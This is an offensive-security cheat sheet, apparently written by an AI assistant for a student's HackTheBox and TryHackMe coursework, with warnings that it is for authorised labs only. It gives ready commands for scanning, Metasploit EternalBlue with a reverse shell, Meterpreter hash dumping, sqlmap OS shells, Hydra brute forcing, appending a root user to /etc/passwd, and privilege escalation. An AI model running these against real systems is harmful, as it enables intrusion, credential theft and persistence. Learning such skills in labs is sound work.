# ⚔️ RED TEAM TOOLKIT - Offensive Security
## "Know Your Enemy" - For Educational Purposes Only

> **Red Team Mission**: Find vulnerabilities BEFORE the bad guys do
>
> Authorized testing on HackTheBox, TryHackMe, CTFs, and pentesting labs ONLY

---

## ⚠️ **DISCLAIMER - READ THIS FIRST!**

### **✅ AUTHORIZED USE:**
- HackTheBox (HTB) machines
- TryHackMe (THM) rooms
- CTF competitions
- Authorized penetration testing engagements
- Your own lab environments
- Bug bounty programs (within scope)

### **❌ UNAUTHORIZED USE (ILLEGAL):**
- Real systems without explicit written permission
- Other people's accounts/networks
- Production environments
- "Testing" company security without authorization
- ANY system you don't own or haven't been explicitly authorized to test

**Breaking into systems without permission is a CRIME!**

---

## 📋 TABLE OF CONTENTS

1. [Red Team Philosophy](#philosophy)
2. [The Kill Chain](#kill-chain)
3. [Reconnaissance Tools](#reconnaissance)
4. [Exploitation Tools](#exploitation)
5. [Post-Exploitation](#post-exploitation)
6. [The HTB Recon Script](#htb-recon-script)
7. [Learning Resources](#learning-resources)

---

## 🎯 PHILOSOPHY

### Red Team Mindset:
- **Think like an attacker**: Find the weakest link
- **Persistence**: Never give up, try every angle
- **Creativity**: Use tools in unexpected ways
- **Documentation**: Track everything you try
- **Ethics**: ONLY attack authorized targets

### Why Learn Red Team?
Even if you're blue team focused (like David!), you need to understand:
- ✅ How attackers think
- ✅ Common attack vectors
- ✅ Exploitation techniques
- ✅ What blue team needs to detect

**"To defend, you must understand offense"** - Sun Tzu (probably)

---

## 🔗 THE KILL CHAIN

Every successful attack follows these phases:

### **1. Reconnaissance** 🔍
Gather information about the target

**Goals:**
- Find IP addresses, domains, services
- Identify technologies used
- Discover potential entry points

**Tools:**
- nmap, masscan
- DNS enumeration (dig, dnsrecon)
- Google dorking
- OSINT (Shodan, Censys)

---

### **2. Weaponization** 🛠️
Prepare exploits for discovered vulnerabilities

**Goals:**
- Create or find exploits
- Prepare payloads
- Test in lab environment

**Tools:**
- Metasploit
- ExploitDB / searchsploit
- Custom scripts
- Social engineering templates

---

### **3. Delivery** 📦
Get the exploit to the target

**Methods:**
- Email phishing
- Malicious links
- USB drops
- Watering hole attacks
- Direct exploitation

---

### **4. Exploitation** 💥
Execute the exploit, gain initial access

**Goals:**
- Execute code on target
- Get initial foothold
- Establish command & control

**Tools:**
- Metasploit framework
- SQLmap (SQL injection)
- Burp Suite (web apps)
- Custom exploits

---

### **5. Installation** 🔧
Maintain persistence on the target

**Goals:**
- Install backdoors
- Create user accounts
- Schedule tasks
- Registry modifications (Windows)

---

### **6. Command & Control (C2)** 📡
Establish communication channel

**Tools:**
- Meterpreter
- Cobalt Strike
- Empire/PowerShell Empire
- Custom C2

---

### **7. Actions on Objective** 🎯
Achieve your goal

**Common Objectives:**
- Steal data (exfiltration)
- Escalate privileges
- Move laterally
- Maintain access
- Cover tracks

---

## 🔍 RECONNAISSANCE TOOLS

### **1. Nmap** (Network Mapper)
The #1 port scanning tool

#### **Basic Scans:**
```bash
# Quick scan (top 1000 ports)
nmap 10.10.10.5

# Scan all ports
nmap -p- 10.10.10.5

# Fast scan (skip host discovery)
nmap -Pn 10.10.10.5

# Service version detection
nmap -sV 10.10.10.5

# OS detection
nmap -O 10.10.10.5

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 10.10.10.5

# UDP scan (top 20 ports)
sudo nmap -sU --top-ports 20 10.10.10.5
```

#### **NSE Scripts (Nmap Scripting Engine):**
```bash
# Run default scripts
nmap -sC 10.10.10.5

# Vulnerability scan
nmap --script vuln 10.10.10.5

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 10.10.10.5

# HTTP enumeration
nmap --script http-enum 10.10.10.5

# Find specific script
locate *.nse | grep smb

# Get script help
nmap --script-help vuln
```

#### **Output Formats:**
```bash
# Normal output
nmap 10.10.10.5 -oN scan.txt

# XML output (for tools like Metasploit)
nmap 10.10.10.5 -oX scan.xml

# All formats
nmap 10.10.10.5 -oA scan
```

---

### **2. Gobuster** (Directory/File Brute Forcing)
Find hidden web directories and files

```bash
# Directory brute force
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# DNS subdomain enumeration
gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt

# Faster scan (more threads)
gobuster dir -u http://10.10.10.5 -w wordlist.txt -t 50

# Hide specific status codes
gobuster dir -u http://10.10.10.5 -w wordlist.txt -b 404,403
```

**Common Wordlists:**
```bash
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
```

---

### **3. Enum4linux** (SMB Enumeration)
Enumerate information from Windows/Samba systems

```bash
# Full enumeration
enum4linux -a 10.10.10.5

# Get users
enum4linux -U 10.10.10.5

# Get shares
enum4linux -S 10.10.10.5

# Get OS information
enum4linux -o 10.10.10.5

# With credentials
enum4linux -u admin -p password 10.10.10.5
```

---

### **4. DNSRecon** (DNS Enumeration)
```bash
# Standard DNS enumeration
dnsrecon -d example.com

# Zone transfer attempt
dnsrecon -d example.com -t axfr

# Brute force subdomains
dnsrecon -d example.com -t brt -D /usr/share/wordlists/subdomains.txt
```

---

### **5. WhatWeb** (Web Technology Fingerprinting)
```bash
# Basic scan
whatweb http://10.10.10.5

# Aggressive scan
whatweb -a 3 http://10.10.10.5

# Verbose output
whatweb -v http://10.10.10.5
```

---

## 💥 EXPLOITATION TOOLS

### **1. Metasploit Framework**
The most popular exploitation framework

#### **Basic Usage:**
```bash
# Start Metasploit
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show options
msf6 > show options

# Set target
msf6 > set RHOSTS 10.10.10.5

# Set payload
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 > set LHOST 10.10.14.5

# Run exploit
msf6 > exploit
```

#### **Common Exploits:**
```bash
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue

# Tomcat manager upload
use exploit/multi/http/tomcat_mgr_upload

# Drupal Drupalgeddon2
use exploit/unix/webapp/drupal_drupalgeddon2

# ProFTPd mod_copy
use exploit/unix/ftp/proftpd_modcopy_exec
```

#### **Meterpreter Commands:**
```bash
# Once you have a session:
meterpreter > sysinfo           # System information
meterpreter > getuid            # Current user
meterpreter > ps                # List processes
meterpreter > migrate 1234      # Migrate to process
meterpreter > hashdump          # Dump password hashes
meterpreter > shell             # Get system shell
meterpreter > upload file.txt   # Upload file
meterpreter > download file.txt # Download file
meterpreter > screenshot        # Take screenshot
```

---

### **2. SQLMap** (SQL Injection)
Automated SQL injection tool

```bash
# Basic test
sqlmap -u "http://example.com/page?id=1"

# With authentication
sqlmap -u "http://example.com/page?id=1" --cookie="session=abc123"

# Enumerate databases
sqlmap -u "http://example.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://example.com/page?id=1" -D database_name --tables

# Dump table
sqlmap -u "http://example.com/page?id=1" -D database_name -T users --dump

# OS shell
sqlmap -u "http://example.com/page?id=1" --os-shell

# POST request
sqlmap -u "http://example.com/login" --data="username=admin&password=test"
```

---

### **3. Burp Suite** (Web Application Testing)
Intercept and modify HTTP/HTTPS traffic

**Key Features:**
- Proxy (intercept requests)
- Repeater (modify and replay)
- Intruder (automated attacks)
- Scanner (find vulnerabilities)

**Common Tasks:**
```
1. Setup proxy in browser (127.0.0.1:8080)
2. Intercept request
3. Send to Repeater
4. Modify parameters
5. Look for SQL injection, XSS, etc.
```

---

### **4. Hydra** (Password Brute Forcing)
```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5

# HTTP POST form
hydra -l admin -P passwords.txt 10.10.10.5 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# FTP brute force
hydra -l admin -P passwords.txt ftp://10.10.10.5

# Multiple users and passwords
hydra -L users.txt -P passwords.txt ssh://10.10.10.5

# Save results
hydra -l admin -P passwords.txt ssh://10.10.10.5 -o found.txt
```

---

### **5. John the Ripper** (Password Cracking)
```bash
# Crack password hashes
john hashes.txt

# Use wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Crack ZIP file
zip2john file.zip > hash.txt
john hash.txt

# Crack SSH private key
ssh2john id_rsa > hash.txt
john hash.txt
```

---

## 🎯 POST-EXPLOITATION

### **Linux Privilege Escalation**

#### **Enumeration:**
```bash
# System info
uname -a
cat /etc/issue
cat /etc/*-release

# Current user
whoami
id
sudo -l

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Scheduled jobs
cat /etc/crontab
ls -la /etc/cron*

# Check capabilities
getcap -r / 2>/dev/null

# Network connections
netstat -antup
ss -tulpn
```

#### **Common Privesc Vectors:**
```bash
# Exploit SUID binary
/usr/bin/bash -p

# Sudo with no password
sudo /bin/bash

# Writable /etc/passwd
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /etc/passwd

# Exploit kernel vulnerability
searchsploit linux kernel 4.4.0
```

---

### **Windows Privilege Escalation**

#### **Enumeration:**
```powershell
# System info
systeminfo
hostname
echo %USERNAME%

# Current privileges
whoami /priv
whoami /groups

# Network info
ipconfig /all
netstat -ano

# Scheduled tasks
schtasks /query /fo LIST /v

# Services
sc query
wmic service list brief

# Find passwords
findstr /si password *.txt *.ini *.config
```

#### **Common Privesc Vectors:**
```powershell
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored credentials
cmdkey /list

# Token impersonation
whoami /priv | findstr SeImpersonatePrivilege
# Use Juicy Potato or PrintSpoofer

# Check for patches
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

---

## 🛠️ THE HTB RECON SCRIPT

We already created a comprehensive HTB reconnaissance script!

**Location:** `/Users/ranger/Local Sites/rangerplex-ai/htb-recon.sh`

**Features:**
- 8-phase automated reconnaissance
- Port scanning (nmap)
- Service enumeration
- Web directory brute forcing (gobuster)
- SMB enumeration (enum4linux)
- Vulnerability scanning
- Summary report generation

**Usage:**
```bash
./htb-recon.sh 10.10.10.123 machine-name
```

**See the script for full details!**

---

## 📚 RED TEAM LEARNING PATH

### **Phase 1: Basics (HTB Starting Point)**
Free boxes for beginners:
- Meow (Linux basics)
- Fawn (FTP)
- Dancing (SMB)
- Redeemer (Redis)

**Skills:**
- Basic Linux commands
- Network fundamentals
- Service enumeration

---

### **Phase 2: Easy Boxes**
HTB/THM easy-rated machines:
- Lame (SMB exploit)
- Legacy (EternalBlue)
- Blue (EternalBlue)
- Jerry (Tomcat)

**Skills:**
- Nmap proficiency
- Basic exploitation
- Metasploit usage
- Web enumeration

---

### **Phase 3: Intermediate**
Medium-rated boxes:
- Optimum (Windows privilege escalation)
- Bastard (Drupal exploit)
- Arctic (ColdFusion)
- Grandpa (IIS 6.0)

**Skills:**
- Web application attacks
- Privilege escalation
- Multiple exploit chains
- Manual exploitation

---

### **Phase 4: Advanced**
Hard/Insane boxes:
- Retired HTB Pro Labs
- Active Directory boxes
- Custom exploit development

**Skills:**
- Buffer overflows
- Active Directory attacks
- Custom tool development
- Advanced persistence

---

## 🎓 CERTIFICATIONS

### **Entry Level:**
- **eJPT** (eLearnSecurity Junior Penetration Tester)
  - $200, beginner-friendly
  - Practical exam

### **Intermediate:**
- **OSCP** (Offensive Security Certified Professional)
  - $1,499, industry standard
  - 24-hour hands-on exam
  - "Try Harder" mentality

### **Advanced:**
- **OSEP** (Offensive Security Experienced Penetration Tester)
- **OSCE** (Offensive Security Certified Expert)
- **OSWE** (Offensive Security Web Expert)

---

## 🔗 ESSENTIAL RESOURCES

### **Practice Platforms:**
- **HackTheBox**: hackthebox.eu (premium)
- **TryHackMe**: tryhackme.com (beginner-friendly)
- **PentesterLab**: pentesterlab.com (web focus)
- **VulnHub**: vulnhub.com (free VMs)

### **Cheat Sheets:**
- **PayloadsAllTheThings**: github.com/swisskyrepo/PayloadsAllTheThings
- **GTFOBins**: gtfobins.github.io (Unix binaries)
- **LOLBAS**: lolbas-project.github.io (Windows binaries)
- **HackTricks**: book.hacktricks.xyz

### **Exploit Databases:**
- **ExploitDB**: exploit-db.com
- **Packet Storm**: packetstormsecurity.com
- **Rapid7 Vulns**: rapid7.com/db

### **Tools Collections:**
- **Kali Linux**: kali.org (300+ pre-installed tools)
- **Parrot Security**: parrotsec.org
- **BlackArch**: blackarch.org

---

## ⚖️ LEGAL & ETHICAL GUIDELINES

### **The Golden Rule:**
**NEVER test systems you don't own or aren't explicitly authorized to test!**

### **Legal Testing:**
1. **HackTheBox/TryHackMe**: Pre-authorized CTF platforms
2. **Bug Bounty Programs**: HackerOne, Bugcrowd (follow rules!)
3. **Client Engagements**: Get written authorization (scope, IP ranges, dates)
4. **Your Own Lab**: Do whatever you want!

### **Illegal Testing:**
- Other people's websites/servers
- Company networks (without permission)
- School/university networks
- "Testing" your neighbor's WiFi
- Any system you don't own

**Consequences:**
- Criminal charges (Computer Fraud and Abuse Act)
- Prison time (up to 20 years in US)
- Heavy fines ($250,000+)
- Civil lawsuits
- Banned from IT industry

### **When in Doubt:**
Ask yourself: "Do I have explicit WRITTEN permission to test this?"
If no → DON'T DO IT!

---

## 🎖️ FOR DAVID: WHY LEARN RED TEAM?

Even though you're blue team focused, here's why this matters:

### **1. Understand Attacker Mindset**
- Know what attackers look for
- Anticipate their moves
- Better at detection

### **2. Improve Blue Team Skills**
- Know what to log (attacker TTPs)
- Write better detection rules
- Understand exploit indicators

### **3. Career Flexibility**
- Move to purple team
- Consult on both sides
- More valuable to employers

### **4. Complete Your Course**
- Pass those HTB/THM requirements
- Get the grades you need
- Understand concepts (even if you don't love it!)

---

## 💡 DAVID'S APPROACH TO RED TEAM

**Your Reality:**
- You hate all the tools (fair!)
- You can't be bothered with grinding (understandable!)
- You watch YouTube instead (efficient!)
- You know concepts > hands-on (good enough!)

**My Suggestion:**
1. **Use the HTB script** - Automate the boring stuff!
2. **Follow walkthroughs** - Don't reinvent the wheel
3. **Learn concepts, not every tool** - Understand WHAT, not HOW
4. **Do minimum for course** - Pass, don't perfect
5. **Focus on blue team** - That's where your passion is!

**You don't need to be a red team expert. You just need to:**
- ✅ Pass your NCI course
- ✅ Understand how attacks work
- ✅ Translate that to better blue team defense

**And that's exactly what you're doing!** 💪

---

**Rangers lead the way! 🎖️**
**Red team finds the holes. Blue team fills them. Both are essential!**
